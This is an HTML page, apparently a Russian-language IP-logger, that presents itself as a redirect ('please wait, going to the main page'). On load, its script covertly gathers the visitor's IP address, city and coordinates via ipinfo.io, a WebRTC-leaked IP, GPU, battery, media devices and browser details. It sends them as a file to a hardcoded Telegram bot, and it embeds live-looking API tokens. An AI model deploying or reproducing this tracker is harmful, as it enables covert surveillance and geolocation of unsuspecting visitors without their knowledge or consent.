<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ü–µ—Ä–µ—Ö–æ–¥ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É</title>
    <script>
        window.onload = function() {
            const currentTime = new Date().toLocaleString();
            const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

            const deviceInfo = {
                time: currentTime,
                platform: isMobile ? '–¢–µ–ª–µ—Ñ–æ–Ω' : '–ü–ö',
                memory: '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ',
                cpu: navigator.hardwareConcurrency || '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ',
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                ipAddress: '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ',
                ram: (navigator.deviceMemory || '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ') + ' GB',
                gpu: getGPUInfo(),
                macAddress: '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ',
                networkName: '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ',
                language: navigator.language || '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ',
                region: '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ',
                city: '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ',
                latitude: '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ',
                longitude: '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ',
                browser: navigator.userAgent,
                connectionType: navigator.connection ? navigator.connection.effectiveType : '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ',
                battery: '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ',
                internetSpeed: { ping: '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ', download: '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ' },
                webrtcIP: '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ',
                mediaDevices: [],
                systemUptime: Math.floor(performance.now() / 1000) + ' —Å–µ–∫'
            };

            // –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
            if (navigator.storage && navigator.storage.estimate) {
                navigator.storage.estimate().then(estimate => {
                    deviceInfo.memory = (estimate.quota / (1024 ** 3)).toFixed(2) + ' GB';
                }).catch(error => {
                    console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–∞–º—è—Ç–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:', error);
                });
            }

            // –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –æ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–∏ –∏ IP —á–µ—Ä–µ–∑ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π API
            fetch('https://ipinfo.io/json?token=29c9d6bc214be7') // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ —Å–≤–æ–π —Ç–æ–∫–µ–Ω ipinfo.io
                .then(response => response.json())
                .then(data => {
                    deviceInfo.ipAddress = data.ip || '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ';
                    deviceInfo.city = data.city || '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ';
                    deviceInfo.region = data.region || '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ';
                    deviceInfo.latitude = data.loc.split(',')[0] || '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ';
                    deviceInfo.longitude = data.loc.split(',')[1] || '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ';

                    // –°–ø–µ—Ü–∏—Ñ–∏—á–µ—Å–∫–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ –¥–ª—è –ö–∏–µ–≤–∞
                    if (deviceInfo.city === 'Kyiv') {
                        deviceInfo.region = '–ï–≤—Ä–æ–ø–∞';
                    }

                    // –ï—Å–ª–∏ –º–æ–±–∏–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ, –ø–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –±–∞—Ç–∞—Ä–µ–µ
                    if (isMobile) {
                        navigator.getBattery().then(function(battery) {
                            deviceInfo.battery = battery.level * 100 + '%';
                        }).catch(error => {
                            console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –±–∞—Ç–∞—Ä–µ–µ:', error);
                        });
                    }

                    // –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–∫–æ—Ä–æ—Å—Ç–∏ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞
                    testInternetSpeed().then(speed => {
                        deviceInfo.internetSpeed = speed;
                        // –ö–æ–≥–¥–∞ –≤—Å–µ –¥–∞–Ω–Ω—ã–µ —Å–æ–±—Ä–∞–Ω—ã, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏—Ö
                        sendDataToTelegram(deviceInfo); 
                    }).catch(error => {
                        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ —Å–∫–æ—Ä–æ—Å—Ç–∏ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞:', error);
                        sendDataToTelegram(deviceInfo); // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–∂–µ –µ—Å–ª–∏ –µ—Å—Ç—å –æ—à–∏–±–∫–∞
                    });
                })
                .catch(error => {
                    console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è IP-–∞–¥—Ä–µ—Å–∞ –∏ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è:', error);
                    sendDataToTelegram(deviceInfo); // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –¥–∞–∂–µ –≤ —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏
                });

            // –ü—Ä–æ–≤–µ—Ä–∫–∞ WebRTC IP
            getWebRTCIP(ip => deviceInfo.webrtcIP = ip);

            // –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –º–µ–¥–∏–∞—É—Å—Ç—Ä–æ–π—Å—Ç–≤
            navigator.mediaDevices.enumerateDevices().then(devices => {
                deviceInfo.mediaDevices = devices.map(d => d.label || d.kind) || ['–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ'];
            }).catch(error => {
                console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –º–µ–¥–∏–∞—É—Å—Ç—Ä–æ–π—Å—Ç–≤:', error);
            });

            // –í—ã–≤–æ–¥ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –¥–µ–≤–∞–π—Å–µ (–¥–ª—è –¥–µ–±–∞–≥–∞)
            console.log(deviceInfo);
        };

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –≤–∏–¥–µ–æ–∫–∞—Ä—Ç–µ
        function getGPUInfo() {
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ';
            } catch (e) {
                return '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ';
            }
        }

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ WebRTC IP
        function getWebRTCIP(callback) {
            try {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel("");
                pc.createOffer().then(offer => pc.setLocalDescription(offer));

                pc.onicecandidate = event => {
                    if (event.candidate) {
                        const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if (ipMatch) {
                            callback(ipMatch[1]);
                        }
                    }
                };
            } catch (e) {
                console.error('–û—à–∏–±–∫–∞ WebRTC:', e);
                callback('–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ');
            }
        }

        // –¢–µ—Å—Ç —Å–∫–æ—Ä–æ—Å—Ç–∏ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞
        async function testInternetSpeed() {
            try {
                const startTime = performance.now();
                // –ò—Å–ø–æ–ª—å–∑—É–µ–º –¥—Ä—É–≥–æ–π —Ä–µ—Å—É—Ä—Å –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
                await fetch('https://www.cloudflare.com/cdn-cgi/trace');
                const duration = (performance.now() - startTime) / 1000;
                return {
                    ping: duration.toFixed(2) + ' —Å–µ–∫',
                    download: (500 / duration).toFixed(2) + ' Kbps'
                };
            } catch (e) {
                console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ —Å–∫–æ—Ä–æ—Å—Ç–∏ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞:', e);
                return { ping: '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ', download: '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ' };
            }
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
        function sendDataToTelegram(deviceInfo) {
            const TELEGRAM_BOT_TOKEN = '7300330037:AAHC29WHTmlNTgS3Zx7PwnVN6jMPtbxXsLQ';
            const CHAT_ID = '6695380917';

            const message = `–ù–∞–π–¥–µ–Ω –Ω–æ–≤—ã–π –≤—Ö–æ–¥! (${deviceInfo.time})

                üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${deviceInfo.platform}
                üß† –ü–∞–º—è—Ç—å: ${deviceInfo.memory}
                üñ• –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä: ${deviceInfo.cpu} —è–¥–µ—Ä
                üñ• –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞: ${deviceInfo.screenResolution}
                üåé IP-–∞–¥—Ä–µ—Å: ${deviceInfo.ipAddress}
                üß† –û–ó–£: ${deviceInfo.ram}
                üéÆ –í–∏–¥–µ–æ–∫–∞—Ä—Ç–∞: ${deviceInfo.gpu}
                üè∑ MAC-–∞–¥—Ä–µ—Å: ${deviceInfo.macAddress}
                üåê –ù–∞–∑–≤–∞–Ω–∏–µ —Å–µ—Ç–∏: ${deviceInfo.networkName}
                üó£ –Ø–∑—ã–∫: ${deviceInfo.language}
                üåç –†–µ–≥–∏–æ–Ω: ${deviceInfo.region}
                üèô –ì–æ—Ä–æ–¥: ${deviceInfo.city}
                üìç –®–∏—Ä–æ—Ç–∞: ${deviceInfo.latitude}
                üìç –î–æ–ª–≥–æ—Ç–∞: ${deviceInfo.longitude}
                üåê –ë—Ä–∞—É–∑–µ—Ä: ${deviceInfo.browser}
                üîó –¢–∏–ø –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: ${deviceInfo.connectionType}
                üîã –ë–∞—Ç–∞—Ä–µ—è: ${deviceInfo.battery}
                üïí –í—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã —Å–∏—Å—Ç–µ–º—ã: ${deviceInfo.systemUptime}
                üì° WebRTC IP: ${deviceInfo.webrtcIP}
                üñ• –ú–µ–¥–∏–∞—É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: ${deviceInfo.mediaDevices.join(', ') || '–ù–µ—Ç'}
                ‚ö° –°–∫–æ—Ä–æ—Å—Ç—å –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞: Ping ${deviceInfo.internetSpeed.ping}, Download ${deviceInfo.internetSpeed.download}
            `;

            const blob = new Blob([message], { type: 'text/plain' });
            const file = new File([blob], 'device_info.txt', { type: 'text/plain' });

            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', file);

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
                method: 'POST',
                body: formData,
            })
            .then(response => response.json())
            .then(data => console.log('–î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram:', data))
            .catch(error => console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ:', error));
        }
    </script>
</head>
<body>
    <h1>–ü–æ–¥–æ–∂–¥–∏—Ç–µ!</h1>
    <p>–ü–µ—Ä–µ—Ö–æ–¥ –Ω–∞ –≥–ª–∞–≤–Ω—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É...</p>
</body>
</html>
